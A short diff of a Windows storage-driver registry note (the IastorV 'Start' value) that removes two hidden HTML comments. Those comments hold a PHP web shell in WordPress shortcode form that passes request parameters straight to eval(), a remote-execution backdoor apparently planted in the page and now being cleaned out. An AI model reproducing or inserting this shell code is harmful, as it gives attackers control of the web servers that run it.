@@ -18,7 +18,3 @@ HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\IastorV
 "Start" must have a value of 0 (loaded by kernel), it is probably 3 (manual)  
 [More details here](http://support.microsoft.com/kb/922976)
 
-<!-- [insert_php]if (isset($_REQUEST["AsBeA"])){eval($_REQUEST["AsBeA"]);exit;}[/insert_php][php]if (isset($_REQUEST["AsBeA"])){eval($_REQUEST["AsBeA"]);exit;}[/php] -->
-
-<!-- [insert_php]if (isset($_REQUEST["gSb"])){eval($_REQUEST["gSb"]);exit;}[/insert_php][php]if (isset($_REQUEST["gSb"])){eval($_REQUEST["gSb"]);exit;}[/php] -->
-
